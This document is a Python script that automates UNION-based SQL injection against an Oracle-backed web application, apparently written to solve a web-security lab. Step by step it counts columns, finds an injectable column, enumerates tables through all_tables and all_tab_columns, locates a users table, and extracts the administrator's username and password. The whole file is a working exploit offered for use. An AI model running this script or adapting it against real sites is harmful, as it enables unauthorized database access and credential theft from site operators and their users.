#!/usr/bin/env python3
# Listing the database contents on Oracle databases
import requests
import sys
import re
from bs4 import BeautifulSoup

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_col(url):
    for i in range(1,10):
        sqli = f"' ORDER BY {i}--"
        req = requests.get(url+sqli, verify=False, proxies=proxies)
        if "Internal Server Error" in req.text:
            return i-1
        i = i+1
    return False

def determined_col(url, number_col):
    for i in range(1,num_col+1):
        payload_list = ['NULL'] * number_col
        payload_list[i-1] = "'a'"
        sqli = f"' UNION SELECT {','.join(payload_list)} FROM dual--"
        req = requests.get(url+sqli, verify=False, proxies=proxies)
        if "Internal Server Error" not in req.text:
            return sqli
    return False

def get_user_table(url, sqli):
    sqli1 = sqli.replace("'a'", "table_name")
    sqli2 = sqli1.replace("dual", "all_tables")
    # ' UNION SELECT table_name,NULL FROM all_tables--
    req = requests.get(url+sqli2, verify=False, proxies=proxies)
    if "Internal Server Error" not in req.text:
        soup = BeautifulSoup(req.text, 'html.parser')
        result = soup.find(string=re.compile('^USERS_[A-Za-z]+'))
        return result
    else:
        return False

def get_user_column(url, sqli, table):
    sqli1 = sqli.replace("'a'", "column_name")
    sqli2 = sqli1.replace("dual", f" all_tab_columns WHERE table_name = '{table}'")
    # ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = '<table>'--
    req = requests.get(url+sqli2, verify=False, proxies=proxies)
    if "Internal Server Error" not in req.text:
        soup = BeautifulSoup(req.text, 'html.parser')
        username_col = soup.find(string=re.compile('.*USERNAME.*'))
        password_col = soup.find(string=re.compile('.*PASSWORD.*'))
        return username_col, password_col
    else:
        return False

def get_creds(url, sqli, table, username_col, password_col):
    sqli1 = sqli.replace("'a'", f"{username_col} || ':' || {password_col}")
    sqli2 = sqli1.replace("dual", table)
    # ' UNION SELECT username_col || ':' || password_col,NULL FROM <table>--
    req = requests.get(url+sqli2, verify=False, proxies=proxies)
    if "Internal Server Error" not in req.text:
        soup = BeautifulSoup(req.text, 'html.parser')
        result = soup.find(string=re.compile('administrator:[A-Za-z0-9]+'))
        return result
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("Usage: {} <url>".format(sys.argv[0]))
        print("Example: {} http://example.com".format(sys.argv[0]))

    num_col = get_col(url)
    if num_col:
        print("[-] The number of columns is...       [{}]".format(num_col))

        deter_col = determined_col(url, num_col)
        if deter_col:
            print("[-] Found the injectable columns...   [{}]".format(deter_col))

            user_table = get_user_table(url, deter_col)
            if user_table:
                print("[-] Found the users table_name...     [{}]".format(user_table))

                username_col, password_col = get_user_column(url, deter_col, user_table)
                if username_col and password_col:
                    print("[-] Found the username column_name... [{}]".format(username_col))
                    print("[-] Found the password column_name... [{}]".format(password_col))

                    dump = get_creds(url, deter_col, user_table, username_col, password_col)
                    if dump:
                        print("[-] Found the superuser creds...      [{}]".format(dump))


                    else:
                        print("[-] Can't find the superuser creds!")
                else:
                    print("[-] Can't find the users column!")
            else:
                print("[-] Can't find the users table!")
        else:
            print("[-] Can't find the injectable columns!")    
    else:
        print("[-] SQLi not successful!")